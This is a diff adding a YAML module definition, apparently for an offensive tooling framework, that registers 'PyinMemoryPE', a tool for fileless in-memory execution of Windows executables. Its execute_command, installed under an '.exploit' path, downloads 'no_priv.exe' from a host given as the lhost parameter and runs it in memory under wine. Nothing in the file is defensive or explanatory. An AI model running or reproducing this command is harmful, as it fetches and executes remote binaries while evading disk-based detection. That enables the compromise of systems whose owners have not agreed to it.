@@ -1,0 +1,16 @@
+name: PyinMemoryPE
+description: >
+  🛠️ Execute any PE (dll,exe) in memory filelessly usage pymemory.py < url> < TYPe >
+author: "ELMERIKH"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+tool:
+  name: PyinMemoryPE
+  repo_url: https://github.com/ELMERIKH/PyinMemoryPE.git
+  install_path: external/.exploit/PyinMemoryPE
+  execute_command: wine python pymemory.py https://{lhost}/no_priv.exe EXE
